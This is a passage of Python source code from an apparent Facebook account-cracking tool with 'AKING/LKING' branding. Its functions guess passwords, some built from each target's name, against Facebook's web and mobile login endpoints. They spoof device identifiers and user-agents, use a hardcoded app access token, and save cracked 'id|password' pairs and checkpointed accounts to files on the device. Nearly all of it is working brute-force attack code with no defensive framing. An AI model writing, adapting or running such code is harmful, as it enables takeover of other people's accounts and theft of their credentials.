			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua1, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			Aking=session.cookies.get_dict().keys()
			if "c_user" in Aking:
				print('\r\r\033[1;32m [LKING-OK] %s | %s'%(ids,pas))
				open('/sdcard/LKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in Aking:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			Aking=session.cookies.get_dict().keys()
			if "c_user" in Aking:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [LKING-OK] %s | %s'%(ids,pas))
				open('/sdcard/LKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in Aking:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [LKING-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/LKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1

def rcrack1(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			phone_company = __iam_genius.split('|')[1]
			dimensions = __iam_genius.split('|')[2]
			
			dvlk = random.choice(usr)
			ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/11;;FBDM/'+'{density=3.0,height=360,width=800};]'
			device_family_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
			data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_PK',
				'client_country_code':'PK',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'user-agent':ua_string,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
			url = 'https://b-api.facebook.com/method/auth.login'
			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
			q = json.loads(po)
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [AKING-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/AKING-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;208m [LKING-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/LKING-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except Exception as e:
		print(e)
def rcrack(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [LKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":ids,
			"pass":pas,
			"login":"Log In"}
			header_freefb = {'authority':'web+api.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"macOS"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': pro}
			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[7:22]
				if uid in oks:pass
				else:
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [LKING-TL] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [LKING-OK] '+uid+' | '+pas)
						cek_apk(session,coki)
						open('/sdcard/LKING-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[24:39]
				if uid in cps:pass
				else:
					print('\r\r\x1b[38;5;208m [LKING-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/LKING-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except:
		pass
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()
###
